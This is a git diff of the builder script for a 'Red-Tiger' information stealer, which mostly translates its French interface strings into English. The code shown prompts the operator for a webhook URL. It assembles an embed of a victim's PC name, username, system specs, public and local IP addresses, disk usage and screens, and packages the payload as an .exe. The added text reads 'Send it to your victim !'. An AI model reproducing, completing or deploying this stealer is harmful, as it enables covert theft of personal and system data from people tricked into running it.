@@ -5,14 +5,10 @@ import subprocess
 import time
 
 TitrePage("Stealer Create")
-LAPprint(f"{couleur.RED}\nLe stealer vous donne les informations du PC qui lance le .exe\nIl y a seulement vous qui voyez les informations de la personne grâce à votre Webhook.")
-LAPprint(f"{couleur.RED}\nInformations que vous récuperer:")
-LAPprint(f"""{couleur.YELLOW}- Ip: Local, Publique, ipv4, ipv6
-- Info Pc: Composant, Nom, Plateforme, Périphérique
-- Et bien plus ! """)
-LAPprint(f"{couleur.RED}\nMettez votre Webhook, laissez l'installation se faire, puis envoyez-le à votre cible !")
-webhook = input(f"\n{couleur.RED}Entre le lien de ton Webhook -> {couleur.RESET}")
-LAPprint(f"{couleur.RED}\nConversion en fichier exécutable (.exe):{couleur.RESET}")
+
+LAPprint(f"{couleur.RED}\nSend it to your victim !")
+webhook = input(f"\n{couleur.RED}URL Webhook -> {couleur.RESET}")
+LAPprint(f"{couleur.RED}\nInstallation of modules and conversion to (.exe):{couleur.RESET}")
 
 
 fichier_texte = './Programmes/Programmes/StealerCreate/StealerCreate.txt'
@@ -242,34 +238,34 @@ def send_embed(webhook_url, title, color=0xf00020):
 embed_title = f'Red-Tiger | Info "{nom_pc}"'
 
 fields = [
-    {"name": f"User Pc:", "value": f"""```Nom      : "{nom_pc}"
+    {"name": f"User Pc:", "value": f"""```Name     : "{nom_pc}"
 Username : "{nom_utilisateur}"```""", "inline": False},
 
-    {"name": f"Systeme:", "value": f"""```Plateforme   : "{plateforme_info}"
+    {"name": f"System:", "value": f"""```Plateform    : "{plateforme_info}"
 Exploitation : "{system_info} {system_version_info}"
 
-CPU : "{cpu_info} {cpu_coeur_info} Coeur"
+CPU : "{cpu_info} {cpu_coeur_info} Core"
 GPU : "{gpu_info}"
 RAM : "{ram_info}Go"```""", "inline": False},
 
-{"name": f"Ip:", "value": f"""```Publique : "{ip_address_public}"
+{"name": f"Ip:", "value": f"""```Public   : "{ip_address_public}"
 Local    : "{ip_address_local}"
 Ipv4     : "{ip_address_ipv4}"
 Ipv6     : "{ip_address_ipv6}"```""", "inline": False},
 
-{"name": f"Disque:", "value": f"""```Drive      : "{lettre_lecteur}/Users/{nom_utilisateur}/"
+{"name": f"Disk:", "value": f"""```Drive      : "{lettre_lecteur}/Users/{nom_utilisateur}/"
 
-Total      : "{espace_disque}Go"
-Utilise    : "{espace_utilise_disque}Go"
-Disponible : "{espace_dispo_disque}Go"```""", "inline": False},
+Total     : "{espace_disque}Go"
+Used      : "{espace_utilise_disque}Go"
+Available : "{espace_dispo_disque}Go"```""", "inline": False},
 
-{"name": f"Peripherique:", "value": f"""```Ecran Principal:
+{"name": f"Peripheral:", "value": f"""```Main Screen:
 {principal_ecran}
 
-Ecran Secondaire:
+Secondary Screen:
 {second_ecran}```""", "inline": False},
 
-{"name": f"Webhook Utilise:", "value": f"""```{webhook_invit}```""", "inline": False},
+{"name": f"Webhook Use:", "value": f"""```{webhook_invit}```""", "inline": False},
 #{"name": f"", "value": f"""```{}```""", "inline": False},
 ] 
 
@@ -369,8 +365,8 @@ def convert_to_exe(script_name, destination_path):
 
 convert_to_exe(fichier_python, chemin_destination)
 
-print(f"\n{couleur.RED}[INFORMATION] | {couleur.LIGHTRED_EX}Le fichier {couleur.CYAN}\"StealerCreate\"{couleur.LIGHTRED_EX} a était créé.", couleur.RESET)
+print(f"\n{couleur.RED}[INFORMATION] | {couleur.LIGHTRED_EX}The file {couleur.CYAN}\"StealerCreate\"{couleur.LIGHTRED_EX} has been created.", couleur.RESET)
 time.sleep(5)
-print(f"\n{couleur.RED}Chemin de \"StealerCreate\": {couleur.CYAN}\"{chemin_destination}\"{couleur.RED}, vous pouvez le renommer, déplacer comme vous voulez !", couleur.RESET)
-time.sleep(8)
+print(f"\n{couleur.RED}road of \"StealerCreate\": {couleur.CYAN}\"{chemin_destination}\"{couleur.RED}, you can rename it, move it as you want !", couleur.RESET)
+time.sleep(5)
 Reset()
